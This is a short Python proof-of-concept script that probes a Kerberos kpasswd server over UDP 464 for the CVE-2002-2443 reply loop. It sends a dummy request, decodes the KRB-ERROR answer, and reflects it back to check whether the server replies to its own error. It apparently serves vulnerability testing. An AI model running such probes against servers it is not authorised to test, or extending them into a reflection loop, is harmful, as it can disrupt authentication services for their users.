#!/usr/bin/env python3
"""udp-send.py: kpasswd's answer to its own error frame, for the kpasswd scenario (CVE-2002-2443's loop).

    udp-send.py <kdc host>

Sends UDP 464 a framed request whose AP-REQ is one zero byte, which no server reads, and prints the reply (MIT's
`process_chpw_request` answers it: length, version 1, AP-REP length 0, a KRB-ERROR whose e-data is the result).
Then sends that reply back, from the same socket, and prints what comes: another frame, or nothing in 3 s. Each
reply line: its size, version, AP-REP length, the KRB-ERROR's code and the e-data's result code and text.
"""
import socket
import sys


def tlv(b, i):
    tag, n = b[i], b[i + 1]
    i += 2
    if n & 0x80:
        k = n & 0x7F
        n, i = int.from_bytes(b[i:i + k], "big"), i + k
    return tag, b[i:i + n], i + n


def shape(rep):
    out = f"{len(rep)} bytes, version {int.from_bytes(rep[2:4], 'big')}, AP-REP length {int.from_bytes(rep[4:6], 'big')}"
    try:
        _, body, _ = tlv(rep, 6)
        _, seq, _ = tlv(body, 0)
        fields, i = {}, 0
        while i < len(seq):
            tag, v, i = tlv(seq, i)
            fields[tag & 0x1F] = tlv(v, 0)[1]
        e = fields.get(12, b"")
        out += f", KRB-ERROR {int.from_bytes(fields[6], 'big')}, result {int.from_bytes(e[:2], 'big')} {e[2:].decode(errors='replace')!r}"
    except (IndexError, KeyError):
        out += ", not a KRB-ERROR: " + rep[6:22].hex()
    return out


s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect((sys.argv[1], 464))
s.settimeout(3)
probe = (8).to_bytes(2, "big") + b"\x00\x01\x00\x01\x00\x00"
s.send(probe)
try:
    first = s.recv(65536)
except socket.timeout:
    sys.exit(f"probe: sent {len(probe)} bytes, no reply in 3 s")
print(f"probe: sent {len(probe)} bytes, reply {shape(first)}")
s.send(first)
try:
    print(f"echo: sent the reply back ({len(first)} bytes), reply {shape(s.recv(65536))}")
except socket.timeout:
    print(f"echo: sent the reply back ({len(first)} bytes), no reply in 3 s")
